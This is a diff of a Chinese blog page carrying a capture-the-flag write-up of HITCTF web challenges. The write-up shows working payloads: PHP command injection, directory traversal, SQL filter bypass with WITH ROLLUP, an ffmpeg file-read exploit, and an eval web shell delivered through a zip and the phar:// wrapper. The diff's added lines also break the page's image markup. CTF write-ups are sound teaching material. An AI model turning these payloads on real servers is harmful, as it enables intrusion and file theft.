@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>HITCTF-WEB题解 · Sky&#39;s blog</title>
+    <title>HITCTF-WEB题解 · sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -214,14 +214,14 @@
     
     <div class="banner">
             <div class="blog-title">
-                <a href="/" >Sky&#39;s blog</a>
+                <a href="/" >sky&#39;s blog</a>
             </div>
             <div class="post-title">
                 <a href="#" class="post-name">HITCTF-WEB题解</a>
             </div>
     </div>
     
-    <a class="home-link" href=/>Sky's blog</a>
+    <a class="home-link" href=/>sky's blog</a>
 </header>
     <div class="wrapper">
         <div class="site-intro" style="
@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3,688</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3,722</span>阅读时长: <span class="post-count reading-time">18 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -414,12 +414,12 @@ height:50vh;
 <p>告诉我们最里面这个是变量,名为<code>phpinfo()</code>,接下来的一层花括号将其解析为字符串<code>&quot;phpinfo()&quot;</code><br>另外,{}有时候也可以当[]使用,文档中有说明：<code>Note: string</code>也可用花括号访问，比如<code>str42</code>,这里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str&#123;42&#125;==$str[42]</span><br></pre></td></tr></table></figure></p>
 <p>所以我的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10013/index.php?str=$&#123;var_dump(`cat%20../../../162920976d9c04ac69e2f4392a8cffbf_flag.txt`)&#125;</span><br></pre></td></tr></table></figure></p>
 <p>即可拿到flag:<code>string(39) &quot;flag{162920976d9c04ac69e2f4392a8cffbf} &quot;</code></p>
-<h2 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h2><p>随便点一点，发现是Django写的<br><img src="/images/image002.jpg"><br>于是想到python的经典问题：目录穿越<br>于是试了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.230.52:8000/../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
+<h2 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h2><p>随便点一点，发现是Django写的<br>![](/images/image002.jpg”&gt;<br>于是想到python的经典问题：目录穿越<br>于是试了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.230.52:8000/../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
 <p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Using the URLconf defined in minicms.urls, Django tried these URL patterns, in this order:</span><br><span class="line">^$</span><br><span class="line">^news/</span><br><span class="line">^admin/</span><br><span class="line">^media\/(?P&lt;path&gt;.*)$</span><br><span class="line">The current path, etc/passwd, didn&apos;t match any of these.</span><br></pre></td></tr></table></figure></p>
 <p>发现media可以用，于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.230.52:8000/media/..%2f__pycache__/</span><br></pre></td></tr></table></figure></p>
 <p>可以得到关键信息泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MYSQL_DB	</span><br><span class="line">&apos;djangodb&apos;</span><br><span class="line">MYSQL_HOST	</span><br><span class="line">&apos;mysql&apos;</span><br><span class="line">MYSQL_PASSWORD	</span><br><span class="line">&apos;Fl4g_1s_n0T_H3re_But_C10se&apos;</span><br><span class="line">MYSQL_PORT	</span><br><span class="line">&apos;3306&apos;</span><br><span class="line">MYSQL_USER	</span><br><span class="line">&apos;manage&apos;</span><br></pre></td></tr></table></figure></p>
 <p>于是我们远程连接Mysql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 118.89.230.52 -P 3306 -u manage -pFl4g_1s_n0T_H3re_But_C10se</span><br></pre></td></tr></table></figure></p>
-<p>成功连接上后，先看数据库<br><img src="/images/image003.jpg"><br>发现<code>F1agIsHere</code>数据库<br>查表<br><img src="/images/image004.jpg"><br>然后挨个查找<br><img src="/images/image005.jpg"><br>发现都是空的<br>于是想到字段名是flag<br>于是用DESC看字段名，而这里4个表名明显是flag，于是我们按顺序读<br><img src="/images/image006.jpg"><br><img src="/images/image007.jpg"><br>得到flag：HITCTF{C10se_Debu91nfo_Is_Immmport4n7}</p>
+<p>成功连接上后，先看数据库<br>![](/images/image003.jpg”&gt;<br>发现<code>F1agIsHere</code>数据库<br>查表<br>![](/images/image004.jpg”&gt;<br>然后挨个查找<br>![](/images/image005.jpg”&gt;<br>发现都是空的<br>于是想到字段名是flag<br>于是用DESC看字段名，而这里4个表名明显是flag，于是我们按顺序读<br>![](/images/image006.jpg”&gt;<br>![](/images/image007.jpg”&gt;<br>得到flag：HITCTF{C10se_Debu91nfo_Is_Immmport4n7}</p>
 <h2 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h2><p>发现直接给出了源码：<br>关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$passwd)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect();</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong password'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wrong username'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>流程就是:<br>1.根据我们输入的username查询<br>2.将查到的密码和我们输入的比对<br>3.相同就获得flag<br>难点如下：<br>1.不知道用户名<br>2.存在许多过滤，比如关键的select等都被过滤了<br>所以可以知道这题不是一道单纯的注入题，那么有没有其他方法让我们的密码和用户名查询结果一致呢？<br>这里有一个方法：<code>with rollup</code><br>我们假设用户名是admin，那么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; group by passwd WITH ROLLUP</span><br></pre></td></tr></table></figure></p>
 <p>会产生一个password为NULL的行<br>而这里有一个检验:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_num_rows($query) == <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
@@ -433,14 +433,14 @@ height:50vh;
 <p>可以看到<code>ffmpeg</code><br>立刻想到ffmpeg的任意文件读取漏洞<br>漏洞简介：<br>利用了ffmpeg可以处理 HLS 播放列表的功能，在 AVI 文件中的 GAB2字幕块中嵌入了一个 HLS 文件，然后提供给ffmpeg进行转码，在解析的过程中把它当做一个 XBIN 的视频流来处理，再通过 XBIN 的编解码器把本地的文件包含进来，最后放在转码后的视频文件当中。<br>这里详细漏洞参照freebuf的文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/column/142775.html</span><br></pre></td></tr></table></figure></p>
 <p>而这题的做题方法如下<br>1.下载脚本 <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py</a><br>2.运行脚本：python3 gen_xbin_avi.py file:///flag.txt 123.avi<br>此时可以生成我们需要的恶意文件123.avi<br>注：这里题目要求必须上传文件名为123.avi的文件<br>上传后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload success: 15174734042.avi </span><br><span class="line">but it wont last long</span><br></pre></td></tr></table></figure></p>
 <p>我们去下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://198.13.58.35:2333/download?name=15174734042.avi</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/image001.jpg"><br>即可下载到文件，打开即可看到flag：<code>HITCTF{O0o0o0oOracle_Attttttack_1s_yinQu3S17ing}</code></p>
+<p>![](/images/image001.jpg”&gt;<br>即可下载到文件，打开即可看到flag：<code>HITCTF{O0o0o0oOracle_Attttttack_1s_yinQu3S17ing}</code></p>
 <h2 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h2><p>此题本质上是一道侧信道攻击爆破的题目<br>我们根据题目所述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">chdir=/app</span><br><span class="line">module=app</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure></p>
 <p>可以知道这是一个python服务端程序，主程序为app.py<br>我们直接访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.83.157:8000/app.py</span><br></pre></td></tr></table></figure></p>
 <p>发现是403，而查阅资料可以知道在python的web服务中<br><code>.py</code>文件生成的pyc文件会被存储在<code>__pycache__</code>文件夹中，并以<code>.cpython-XX.pyc</code>为扩展名<br>而XX和版本号有关<br>于是我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://s3.chal.ctf.westerns.tokyo/__pycache__/app.cpython-XX.pyc</span><br></pre></td></tr></table></figure></p>
 <p>这里XX可以爆破一下，从20-40<br>这里可以发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://s3.chal.ctf.westerns.tokyo/__pycache__/app.cpython-35.pyc</span><br></pre></td></tr></table></figure></p>
 <p>可以下载到文件<br>我们反编译一下得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># visit http://tool.lu/pyc/ for more information</span><br><span class="line">from flask import Flask, request, jsonify, render_template</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from binascii import b2a_hex, a2b_hex</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[&apos;KEY&apos;]</span><br><span class="line">flag_enc = &apos;9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add&apos;</span><br><span class="line"></span><br><span class="line">def index():</span><br><span class="line">    return render_template(&apos;index.html&apos;, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(&apos;/&apos;)(index)</span><br><span class="line"></span><br><span class="line">def getflag():</span><br><span class="line">    req = request.json</span><br><span class="line">    if not req:</span><br><span class="line">        return jsonify(result = False)</span><br><span class="line">    if None not in req:</span><br><span class="line">        return jsonify(result = False)</span><br><span class="line">    key = None[&apos;key&apos;]</span><br><span class="line">    if len(key) != len(flag_key):</span><br><span class="line">        return jsonify(result = False)</span><br><span class="line">    for (x, y) in zip(key, flag_key):</span><br><span class="line">        if ord(x) ^ ord(y):</span><br><span class="line">            return jsonify(result = False)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, b&apos;0000000000000000&apos;)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(&apos;utf-8&apos;).strip()</span><br><span class="line">    return jsonify(result = True, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(&apos;/getflag&apos;, methods = [</span><br><span class="line">    &apos;POST&apos;])(getflag)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
 <p>这里我们可以看到是一个AES-CBC的题目<br>这里受到CBC的padding oracle攻击的启发，我马上顺着题目的结构尝试了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此时果然服务器响应500<br>于是我开始从第一个字符开始爆破<br>此时存在2种状态<br><img src="/images/image009.jpg"><br>如果正确则会服务器500<br><img src="/images/image010.jpg"><br>而如果错误则会回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:false&#125;</span><br></pre></td></tr></table></figure></p>
+<p>此时果然服务器响应500<br>于是我开始从第一个字符开始爆破<br>此时存在2种状态<br>![](/images/image009.jpg”&gt;<br>如果正确则会服务器500<br>![](/images/image010.jpg”&gt;<br>而如果错误则会回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:false&#125;</span><br></pre></td></tr></table></figure></p>
 <p>故此我们可以爆破得到key：<code>{&quot;key&quot;:[&quot;5&quot;,&quot;e&quot;,&quot;c&quot;,&quot;u&quot;,&quot;r&quot;,&quot;3&quot;,&quot;p&quot;,&quot;P&quot;,&quot;Y&quot;,&quot;p&quot;,&quot;y&quot;,&quot;P&quot;,&quot;Y&quot;,&quot;k&quot;,&quot;3&quot;,&quot;y&quot;]}</code><br>此时提交key即可得到flag:<code>HITCTF{O0o0o0oOracle_Attttttack_1s_yinQu3S17ing}</code></p>
 <h2 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h2><p>拿到题目后注意url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10012/?page=login</span><br></pre></td></tr></table></figure></p>
 <p>发现存在文件包含，随即尝试读源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
@@ -448,10 +448,10 @@ height:50vh;
 <p>发现是一个强行拼接.php的文件包含<br>再读login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($username === <span class="string">"admin"</span> &amp;&amp; sha1(md5($password)) === $admin_hash)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'hitctf'</span>)&#123;</span><br><span class="line">                    $logfile = <span class="string">"log/"</span>.$username.<span class="string">".log"</span>;</span><br><span class="line">                    $content = $username.<span class="string">" =&gt; "</span>.$password;</span><br><span class="line">                    file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>发现重点在于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">else&#123;</span><br><span class="line">            if (isset($_GET[&apos;debug&apos;]))&#123;</span><br><span class="line">                if($_GET[&apos;debug&apos;] === &apos;hitctf&apos;)&#123;</span><br><span class="line">                    $logfile = &quot;log/&quot;.$username.&quot;.log&quot;;</span><br><span class="line">                    $content = $username.&quot; =&gt; &quot;.$password;</span><br><span class="line">                    file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &apos;&lt;script&gt;alert(&quot;Login failed!&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;&lt;script&gt;alert(&quot;Login failed!&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
 <p>我们的用户名是log的文件名，而内容是用户名+” =&gt; “+密码的拼接<br>这里看到文件包含，我们容易想到<br>写一个shell文件，再包含进来，但是他强行拼接了.php，这里直接包含是行不通的……<br>所以想到php伪协议绕过，例如经典的phar://和Zip://<br>所以我们可以写一个shell文件，压缩成压缩包，再写入<br>但是问题又来了：<br>1.压缩包中间会被插入” =&gt; “，导致无法解压<br>2.文件名中不可带入%00<br>那么如何解决呢？<br>我的做法是随便写一个txt文件，再写一个我们的shell文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>($_POST[sky]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后压缩成zip文件如图：<br><img src="/images/hitctf2018 (1).jpg"><br>由于我们的文件会被拼接”=&gt;”并且文件名不可带%00<br>所以我们选择输入方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=%50%4B%03%04%0A</span><br><span class="line">password=%00%84%56%42%4C%07%91%35%16%17%00%00%00%17%00%00%00%0B%00%00%00%74%65%73%74%73%6B%79%2E%70%68%70%3C%3F%70%68%70%20%0D%0A%70%68%70%69%6E%66%6F%28%29%3B%0D%0A%20%3F%3E%50%4B%03%04%0A%00%00%00%00%00%AE%4B%42%4C%54%3D%6E%D7%04%00%00%00%04%00%00%00%07%00%00%00%73%6B%79%2E%74%78%74%20%3D%3E%20%50%4B%01%02%3F%00%0A%00%00%00%00%00%84%56%42%4C%07%91%35%16%17%00%00%00%17%00%00%00%0B%00%24%00%00%00%00%00%00%00%20%00%00%00%00%00%00%00%74%65%73%74%73%6B%79%2E%70%68%70%0A%00%20%00%00%00%00%00%01%00%18%00%B5%7B%94%D0%D0%9B%D3%01%7E%46%23%B8%D0%9B%D3%01%7E%46%23%B8%D0%9B%D3%01%50%4B%01%02%3F%00%0A%00%00%00%00%00%AE%4B%42%4C%54%3D%6E%D7%04%00%00%00%04%00%00%00%07%00%24%00%00%00%00%00%00%00%20%00%00%00%40%00%00%00%73%6B%79%2E%74%78%74%0A%00%20%00%00%00%00%00%01%00%18%00%1A%E1%18%44%C5%9B%D3%01%8C%12%56%3F%C5%9B%D3%01%8C%12%56%3F%C5%9B%D3%01%50%4B%05%06%00%00%00%00%02%00%02%00%B6%00%00%00%69%00%00%00%00%00</span><br></pre></td></tr></table></figure></p>
-<p>此时拼接后的文件如图<br><img src="/images/hitctf2018 (2).jpg"><br>那么此时压缩包还可以解压吗？<br>我们试试：<br><img src="/images/hitctf2018 (3).jpg"><br>发现sky.txt已经破损了，我们再试试shell文件<br><img src="/images/hitctf2018 (4).jpg"><br>发现sky.php竟然可以正常解压！<br>这就意味着我们用伪协议可以正常使用，并且getshell!<br>并且这也说明了为什么不能直接只压缩单个的shell，因为这也肯定解压会破损，而加入随便一个txt等于起到了保护作用，防止后面shell文件破损，这可能和zip的文件格式有关，有兴趣的可以深入研究。<br>所以我们写入文件后，payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get请求</span><br><span class="line">http://120.24.215.80:10012/?page=phar://./log/PK%03%04%0a.log/sky</span><br><span class="line">post请求</span><br><span class="line">sky=system(&apos;cat ../../../../d124abbe4cb6aa1621a8ca9519c0f5bf_flag.txt&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>然后压缩成zip文件如图：<br><img src="/images/hitctf2018 (1" alt="">.jpg”&gt;<br>由于我们的文件会被拼接”=&gt;”并且文件名不可带%00<br>所以我们选择输入方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=%50%4B%03%04%0A</span><br><span class="line">password=%00%84%56%42%4C%07%91%35%16%17%00%00%00%17%00%00%00%0B%00%00%00%74%65%73%74%73%6B%79%2E%70%68%70%3C%3F%70%68%70%20%0D%0A%70%68%70%69%6E%66%6F%28%29%3B%0D%0A%20%3F%3E%50%4B%03%04%0A%00%00%00%00%00%AE%4B%42%4C%54%3D%6E%D7%04%00%00%00%04%00%00%00%07%00%00%00%73%6B%79%2E%74%78%74%20%3D%3E%20%50%4B%01%02%3F%00%0A%00%00%00%00%00%84%56%42%4C%07%91%35%16%17%00%00%00%17%00%00%00%0B%00%24%00%00%00%00%00%00%00%20%00%00%00%00%00%00%00%74%65%73%74%73%6B%79%2E%70%68%70%0A%00%20%00%00%00%00%00%01%00%18%00%B5%7B%94%D0%D0%9B%D3%01%7E%46%23%B8%D0%9B%D3%01%7E%46%23%B8%D0%9B%D3%01%50%4B%01%02%3F%00%0A%00%00%00%00%00%AE%4B%42%4C%54%3D%6E%D7%04%00%00%00%04%00%00%00%07%00%24%00%00%00%00%00%00%00%20%00%00%00%40%00%00%00%73%6B%79%2E%74%78%74%0A%00%20%00%00%00%00%00%01%00%18%00%1A%E1%18%44%C5%9B%D3%01%8C%12%56%3F%C5%9B%D3%01%8C%12%56%3F%C5%9B%D3%01%50%4B%05%06%00%00%00%00%02%00%02%00%B6%00%00%00%69%00%00%00%00%00</span><br></pre></td></tr></table></figure></p>
+<p>此时拼接后的文件如图<br><img src="/images/hitctf2018 (2" alt="">.jpg”&gt;<br>那么此时压缩包还可以解压吗？<br>我们试试：<br><img src="/images/hitctf2018 (3" alt="">.jpg”&gt;<br>发现sky.txt已经破损了，我们再试试shell文件<br><img src="/images/hitctf2018 (4" alt="">.jpg”&gt;<br>发现sky.php竟然可以正常解压！<br>这就意味着我们用伪协议可以正常使用，并且getshell!<br>并且这也说明了为什么不能直接只压缩单个的shell，因为这也肯定解压会破损，而加入随便一个txt等于起到了保护作用，防止后面shell文件破损，这可能和zip的文件格式有关，有兴趣的可以深入研究。<br>所以我们写入文件后，payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get请求</span><br><span class="line">http://120.24.215.80:10012/?page=phar://./log/PK%03%04%0a.log/sky</span><br><span class="line">post请求</span><br><span class="line">sky=system(&apos;cat ../../../../d124abbe4cb6aa1621a8ca9519c0f5bf_flag.txt&apos;);</span><br></pre></td></tr></table></figure></p>
 <p>即可拿到flag：<code>flag{61894b21be75260c4964065b1eecec4d}</code></p>
-<h2 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h2><p>打开页面是一个查询界面<br><img src="/images/image008.jpg"><br>我们抓包研究一下:<br>发现查询时候发出的数据为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=%7B+getscorebyid(id%3A+%22GE%3D%3D%3D%3D%3D%3D%22)%7B+id+name+score+%7D+%7D</span><br></pre></td></tr></table></figure></p>
+<h2 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h2><p>打开页面是一个查询界面<br>![](/images/image008.jpg”&gt;<br>我们抓包研究一下:<br>发现查询时候发出的数据为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=%7B+getscorebyid(id%3A+%22GE%3D%3D%3D%3D%3D%3D%22)%7B+id+name+score+%7D+%7D</span><br></pre></td></tr></table></figure></p>
